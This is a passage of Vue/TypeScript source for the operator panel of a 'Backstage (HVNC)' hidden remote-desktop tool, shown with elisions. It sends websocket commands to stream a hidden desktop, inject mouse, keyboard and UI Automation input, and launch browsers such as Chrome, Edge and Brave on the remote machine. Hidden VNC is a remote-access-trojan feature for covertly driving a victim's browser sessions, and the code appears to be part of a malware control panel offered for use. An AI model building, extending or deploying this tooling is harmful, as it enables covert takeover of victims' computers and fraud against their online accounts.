...
function handleMessage(msg: Record<string, unknown>) {
  if (msg.type === "ready") {
    ...
    ws.sendJson({ type: "backstage_start", autoStartExplorer: true, webrtc: false });
  } else if (msg.type === "status") {
    const st = msg.status as string;
    statusText.value = st;
    if (st === "offline" || st === "stopped") { connected.value = false; streaming.value = false; }
    ...
    if (msg.bytes != null) bandwidth.value = (msg.bytes as number) > 1048576 ? `${((msg.bytes as number) / 1048576).toFixed(1)} MB` : `${((msg.bytes as number) / 1024).toFixed(0)} KB`;
  } else if (msg.type === "backstage_displays") {
    const displays = msg.displays as Array<{ index: number; name?: string; width: number; height: number }>;
    if (displays?.length) displayOptions.value = displays.map(d => ({ value: d.index, label: d.name || `Display ${d.index} (${d.width}x${d.height})` }));
  }
}
...
function getCanvasCoords(e: MouseEvent) {
  ...
  return { x: Math.round(((e.clientX - rect.left) / rect.width) * canvas.width), y: Math.round(((e.clientY - rect.top) / rect.height) * canvas.height) };
}
...
function sendWheel(e: WheelEvent) {
  ...
  if (!streaming.value || !mouseEnabled.value) return;
  const { x, y } = getCanvasCoords(e);
  ws.sendJson({ type: "backstage_mouse_wheel", delta: e.deltaY > 0 ? -3 : 3, x, y });
}
...
function toggleMouse() {
  ...
  ws.sendJson({ type: mouseEnabled.value ? "backstage_enable_mouse" : "backstage_disable_mouse" });
}

function toggleKeyboard() {
  keyboardEnabled.value = !keyboardEnabled.value;
  ws.sendJson({ type: keyboardEnabled.value ? "backstage_enable_keyboard" : "backstage_disable_keyboard" });
}

function toggleUIA() {
  uiaEnabled.value = !uiaEnabled.value;
  ws.sendJson({ type: uiaEnabled.value ? "backstage_enable_uia" : "backstage_disable_uia" });
}

function launchBrowser(browser: string) {
  ws.sendJson({ type: "backstage_launch_browser", browser });
}

function sendQuality() {
  ws.sendJson({ type: "backstage_set_quality", quality: qualityPct.value, codec: "h264" });
}

function sendDisplay() {
  ws.sendJson({ type: "backstage_set_display", display: selectedDisplay.value });
}

function requestDisplays() {
  ws.sendJson({ type: "backstage_displays" });
}

function toggleFullscreen() {
  const el = canvasEl.value?.parentElement;
  if (!el) return;
  if (!document.fullscreenElement) { el.requestFullscreen(); fullscreen.value = true; }
  else { document.exitFullscreen(); fullscreen.value = false; }
}

function stopStream() {
  ws.sendJson({ type: "backstage_stop" });
  streaming.value = false; statusText.value = "Stopped";
}

function startStream() {
  ws.sendJson({ type: "backstage_start", autoStartExplorer: true, webrtc: false });
  streaming.value = true; statusText.value = "Starting...";
}
...
onUnmounted(() => {
  if (streaming.value) ws.sendJson({ type: "backstage_stop" });
  ws.disconnect();
...
<template>
  <div class="h-full flex flex-col">
    ...
    <div class="flex items-center gap-2 flex-shrink-0 flex-wrap" style="padding-bottom:8px;border-bottom:1px solid rgba(51,65,85,0.3);margin-bottom:8px">
      ...
      <h1 class="text-sm font-semibold text-slate-100">Backstage (HVNC)</h1>
      ...
      <div class="ml-auto flex items-center gap-1.5">
        <!-- Input toggles -->
        <button @click="toggleMouse" :title="mouseEnabled ? 'Mouse ON' : 'Mouse OFF'" class="btn btn-xs" :class="mouseEnabled ? 'btn-primary' : ''">
          <i class="fa-solid fa-computer-mouse"></i>
        </button>
        <button @click="toggleKeyboard" :title="keyboardEnabled ? 'Keyboard ON' : 'Keyboard OFF'" class="btn btn-xs" :class="keyboardEnabled ? 'btn-primary' : ''">
          <i class="fa-solid fa-keyboard"></i>
        </button>
        <button @click="toggleUIA" :title="uiaEnabled ? 'UIA ON' : 'UIA OFF'" class="btn btn-xs" :class="uiaEnabled ? 'btn-primary' : ''">
        ...
        <div class="relative group">
          <button class="btn btn-xs" title="Launch browser"><i class="fa-solid fa-globe"></i></button>
          <div class="hidden group-hover:block absolute right-0 top-full mt-1 z-50" style="min-width:140px;background:#0f172a;border:1px solid rgba(51,65,85,0.5);border-radius:8px;padding:4px;box-shadow:0 8px 24px rgba(0,0,0,0.5)">
            <button v-for="b in ['chrome','firefox','edge','opera','brave','vivaldi']" :key="b" @click="launchBrowser(b)" class="block w-full text-left text-xs px-3 py-1.5 rounded hover:bg-slate-800 text-slate-300 capitalize">{{ b }}</button>
          </div>
        </div>
    ...
    <div class="flex-1 bg-black border border-slate-800 rounded-lg overflow-hidden flex items-center justify-center relative" style="min-height:0">
      <canvas ref="canvasEl" class="max-w-full max-h-full outline-none"
      ...
      <div v-if="!connected" class="absolute inset-0 flex items-center justify-center">
        <div class="text-center">
          ...
          <button @click="reconnect" class="btn btn-primary btn-sm" style="margin-top:12px"><i class="fa-solid fa-rotate-right" style="margin-right:6px"></i>Connect</button>
        </div>
      </div>
    </div>
  </div>
